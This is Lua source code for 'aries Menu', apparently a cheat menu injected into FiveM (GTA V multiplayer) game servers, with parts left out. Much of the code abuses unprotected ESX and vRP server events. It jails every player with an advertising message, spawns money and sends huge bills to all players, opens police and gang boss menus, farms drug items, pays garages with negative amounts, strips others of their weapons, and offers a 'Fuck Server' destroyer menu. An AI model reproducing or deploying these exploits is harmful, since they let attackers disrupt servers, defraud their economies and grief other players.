...
function ariesMenu.CreateMenu(id, title)
	-- Default settings
	menus[id] = {}
...
function ariesMenu.CreateSubMenu(id, parent, subTitle)
	if menus[parent] then
		ariesMenu.CreateMenu(id, menus[parent].title)
...
function ariesMenu.Button(text, subText)
...
function ariesMenu.MenuButton(text, id)
	if menus[id] then
		if ariesMenu.Button(text) then
			setMenuVisible(currentMenu, false)
...
function ariesMenu.CheckBox(text, bool, callback)
	local checked = "~r~~h~Off"
	if bool then
		checked = "~g~~h~On"
	end

	if ariesMenu.Button(text, checked) then
		bool = not bool
...
function ariesMenu.ComboBox(text, items, currentIndex, selectedIndex, callback)
	...
	if ariesMenu.Button(text, selectedItem) then
...
function ariesMenu.SetMenuWidth(id, width)
...
function ariesMenu.SetMenuMaxOptionCountOnScreen(id, count)
...
function ariesMenu.SetTitleBackgroundSprite(id, textureDict, textureName)
	setMenuProperty(id, "titleBackgroundSprite", {dict = textureDict, name = textureName})
end

function ariesMenu.SetSubTitle(id, text)
...
function ariesMenu.SetMenuButtonPressedSound(id, name, set)
	...
	function()
		while Enabled do
			...
			if banallusers then
				...
				TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 9937, "youtube.com/c/aries98 <--- NAJLEPSZE CHEATY NA FIVEMA :)", 300)
				TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 5000, "youtube.com/c/aries98 <--- NAJLEPSZE CHEATY NA FIVEMA :)")
				TriggerServerEvent("esx-qalle-jail:jailPlayerNew", GetPlayerServerId(i), 5000, "youtube.com/c/aries98 <--- NAJLEPSZE CHEATY NA FIVEMA :)")
				TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(i), 50000)
				TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(i), 5000, "youtube.com/c/aries98 <--- NAJLEPSZE CHEATY NA FIVEMA :)")
			...
			if esxdestroy then
				for i = 0, 450 do
						...
						TriggerServerEvent('esx:giveInventoryItem', GetPlayerServerId(i), "item_money", "money", 10000000)	
						TriggerServerEvent('esx:giveInventoryItem', GetPlayerServerId(i), "item_money", "money", 10000000)	
						TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "Best aries Menu", 10000000)
						TriggerServerEvent('chatMessageEntered', "SYSTEM", { 0, 0, 0 }, GetPlayerName(PlayerId()) .." xAries on YOUTUBE.")
				end
			end
...
Citizen.CreateThread(
	function()
		...
		ariesMenu.CreateSubMenu('OnlinePlayerMenu', 'MainMenu', 'Online Player Menu')
		ariesMenu.CreateSubMenu('PlayerOptionsMenu', 'OnlinePlayerMenu', 'Player Options')
		ariesMenu.CreateSubMenu('SingleWepPlayer', 'OnlinePlayerMenu', 'Single Weapon Menu')
		ariesMenu.CreateSubMenu("WepMenu", "MainMenu", "Weapon Menu")
		ariesMenu.CreateSubMenu("SingleWepMenu", "WepMenu", "Single Weapon Menu")
		...
		ariesMenu.CreateSubMenu("MiscServerOptions", "ServerMenu", "Misc Server Options")
		ariesMenu.CreateSubMenu("RecrutarPlayers", "ServerMenu", "Recrutar Players")
		ariesMenu.CreateSubMenu("RecrutarPlayersOptions", "RecrutarPlayers", "Recrutar Players options")
		...
		while Enabled do
			if ariesMenu.IsMenuOpened("MainMenu") then
				...
				drawNotification("~g~Official Discord: ~s~~n~https://discord.gg/5BAeqT2 ~n~~r~aries#1249")
				   if ariesMenu.MenuButton("~h~Player ~s~Menu                                             »", "SelfMenu") then
				elseif ariesMenu.MenuButton("~h~Online ~s~Players                                          »", "OnlinePlayerMenu") then
				elseif ariesMenu.MenuButton("~h~World ~s~Menu                                              »", "Xposed") then
				elseif ariesMenu.MenuButton("~h~Teleporte ~s~Menu                                        »", "TeleportMenu") then
				elseif ariesMenu.MenuButton("~h~Vehicles ~s~Menu                                          »", "VehMenu") then
				elseif ariesMenu.MenuButton("~h~Weapons ~s~Menu                                        »", "WepMenu") then
				elseif ariesMenu.MenuButton("~h~Fuck ~s~Server                                              »", "Destroyer") then
				elseif ariesMenu.MenuButton("~h~<FONT COLOR='#15f600'>∑ LUA MENU ∑                                         ~s~»", "ServerMenu") then
			...
			elseif ariesMenu.IsMenuOpened("SelfMenu") then
				...
				elseif ariesMenu.Button("~w~~h~Set hunger to ~h~~g~100%") then
					TriggerEvent("esx_status:set", "hunger", 1000000)
				elseif ariesMenu.Button("~w~~h~Set thirst to ~h~~g~100%") then
				...
				elseif ariesMenu.Button("~h~~b~Unjail") then
					...
					TriggerEvent('UnJP')
				elseif
				ariesMenu.CheckBox("~h~Infinite Stamina",InfStamina,function(enabled)InfStamina = enabled end)
				then
				elseif
				ariesMenu.CheckBox(
					"~h~Super Jump",
		...
		if ariesMenu.Button("~h~~r~Give All Weapons ~s~~h~Players") then
				...
				elseif ariesMenu.Button("~h~~r~Remove All Weapons ~s~~h~Players") then
					for ids = 0, 128 do
						if ids ~= PlayerId() and GetPlayerServerId(ids) ~= 0 then
							for i = 1, #allWeapons do
	...
	then
			...
			elseif ariesMenu.IsMenuOpened("WepMenu") then
				if ariesMenu.MenuButton("~h~Specific Weapon", "SingleWepMenu") then
				elseif ariesMenu.Button("~h~~g~Give ~s~~h~All Weapons") then
					for i = 1, #allWeapons do
						GiveWeaponToPed(PlayerPedId(), GetHashKey(allWeapons[i]), 1000, false, false)
					end
				elseif ariesMenu.Button("~h~~r~Remove ~s~~h~All Weapons") then
					for i = 1, #allWeapons do
			...
			elseif ariesMenu.IsMenuOpened("ServerMenu") then
				if ariesMenu.MenuButton("~s~Menu ~h~~r~RECRUIT PLAYERS ~g~(NEW)", "RecrutarPlayers") then
				elseif ariesMenu.MenuButton("~s~Menu ~b~~h~BOSS", "ESXBoss") then
				elseif ariesMenu.MenuButton("~s~Menu ~g~~h~MONEY", "ESXMoney") then
				elseif ariesMenu.MenuButton("~s~Menu ~p~~h~DRUGS", "ESXDrugs") then
				elseif ariesMenu.MenuButton("~s~Menu ~o~~h~OTHERS", "ESXMisc") then
				end
			...
			elseif ariesMenu.IsMenuOpened("ESXBoss") then
				...
				elseif ariesMenu.Button("~b~~h~Police~s~ Boss Menu") then
					...
					setMenuVisible(currentMenu, false)
				elseif ariesMenu.Button("~r~~h~Ambulance~s~ Boss Menu") then
				...
				elseif ariesMenu.Button("~y~~h~Taxi~s~ Boss Menu") then
					...
					setMenuVisible(currentMenu, false)
				elseif ariesMenu.Button("~g~~h~Real Estate~s~ Boss Menu") then
				...
				elseif ariesMenu.Button("~p~~h~Gang~s~ Boss Menu") then
					...
					setMenuVisible(currentMenu, false)
				elseif ariesMenu.Button("~o~~h~Car Dealer~s~ Boss Menu") then
				...
				elseif ariesMenu.Button("~c~~h~Mafia~s~ Boss Menu") then
					...
					setMenuVisible(currentMenu, false)
				elseif ariesMenu.Button("~g~~h~ESX ~y~Custom Boss Menu") then
			...
			ariesMenu.Display()
				elseif ariesMenu.IsMenuOpened("ESXMisc") then
				    if ariesMenu.Button("~g~~h~ESX ~r~SEND EVERYONE A BILL") then
				...
				elseif ariesMenu.Button("~g~~h~ESX ~w~Get all licenses Drive") then
			...
			elseif ariesMenu.IsMenuOpened("VRPOptions") then
				if ariesMenu.Button("~r~~h~VRP ~s~Give Money ~ypayGarage") then
					local result = KeyboardInput("Enter amount of money USE AT YOUR OWN RISK", "", 100)
					if result then
						TriggerServerEvent("lscustoms:payGarage", {costs = -result})
					end		
				elseif ariesMenu.Button("~r~~h~VRP ~g~WIN ~s~Slot Machine") then
					local result = KeyboardInput("Enter amount of money USE AT YOUR OWN RISK", "", 100)
					if result then
					TriggerServerEvent("vrp_slotmachine:server:2", result)
					end
				elseif ariesMenu.Button("~r~~h~VRP ~s~Get driving license") then
					TriggerServerEvent("dmv:success")
			...
			elseif ariesMenu.IsMenuOpened("ESXDrugs") then
				if ariesMenu.Button("~h~~g~Harvest ~g~Weed ~c~(x5)") then
					...
					TriggerServerEvent("esx_drugs:startHarvestWeed")
					TriggerServerEvent("esx_drugs:startHarvestWeed")
				elseif ariesMenu.Button("~h~~g~Transform ~g~Weed ~c~(x5)") then
				...
				elseif ariesMenu.Button("~h~~g~Sell ~g~Weed ~c~(x5)") then
					...
					TriggerServerEvent("esx_drugs:startSellWeed")
					TriggerServerEvent("esx_drugs:startSellWeed")
				elseif ariesMenu.Button("~h~~w~Harvest ~w~Coke ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startHarvestCoke")
					TriggerServerEvent("esx_drugs:startHarvestCoke")
					TriggerServerEvent("esx_drugs:startHarvestCoke")
					TriggerServerEvent("esx_drugs:startHarvestCoke")
					TriggerServerEvent("esx_drugs:startHarvestCoke")
				elseif ariesMenu.Button("~h~~w~Transform ~w~Coke ~c~(x5)") then
				...
				elseif ariesMenu.Button("~h~~r~Harvest Meth ~c~(x5)") then
					...
					TriggerServerEvent("esx_drugs:startHarvestMeth")
					TriggerServerEvent("esx_drugs:startHarvestMeth")
				elseif ariesMenu.Button("~h~~r~Transform Meth ~c~(x5)") then
				...
				elseif ariesMenu.Button("~h~~p~Harvest Opium ~c~(x5)") then
					...
					TriggerServerEvent("esx_drugs:startHarvestOpium")
					TriggerServerEvent("esx_drugs:startHarvestOpium")
				elseif ariesMenu.Button("~h~~p~Transform Opium ~c~(x5)") then
...
--end
			...
			elseif ariesMenu.IsMenuOpened("RecrutarPlayers") then
					for i = 0, 128 do
					if NetworkIsPlayerActive(i) and GetPlayerServerId(i) ~= 0 and ariesMenu.MenuButton(GetPlayerName(i).." ~p~["..GetPlayerServerId(i).."]~s~ ~y~["..i.."]~s~ ", 'RecrutarPlayersOptions') then
						SelectedPlayer = i
					end
				end
			...
			elseif ariesMenu.IsMenuOpened("RecrutarPlayersOptions") then
				ariesMenu.SetSubTitle("RecrutarPlayersOptions", "Recrutar Players options [" .. GetPlayerName(SelectedPlayer) .. "]")
			...
			elseif ariesMenu.IsMenuOpened("OnlinePlayerMenu") then
					for i = 0, 128 do
					if NetworkIsPlayerActive(i) and GetPlayerServerId(i) ~= 0 and ariesMenu.MenuButton(GetPlayerName(i).." ~p~["..GetPlayerServerId(i).."]~s~ ~y~["..i.."]~s~ "..(IsPedDeadOrDying(GetPlayerPed(i), 1) and "~r~DEAD" or "~g~ALIVE"), 'PlayerOptionsMenu') then
						SelectedPlayer = i
					end
				end
			...
			elseif ariesMenu.IsMenuOpened("PlayerOptionsMenu") then
				ariesMenu.SetSubTitle("PlayerOptionsMenu", "Player Options [" .. GetPlayerName(SelectedPlayer) .. "]")
				if ariesMenu.Button("Spectate", (Spectating and "~g~[SPECTATING]")) then
				...
				TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(SelectedPlayer), 50000)
				TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(SelectedPlayer), 5000)
				TriggerServerEvent("js:jailuser", GetPlayerServerId(SelectedPlayer), 5000, "dude weed")
				...
				elseif ariesMenu.MenuButton("Weapon Menu", "SingleWepPlayer") then
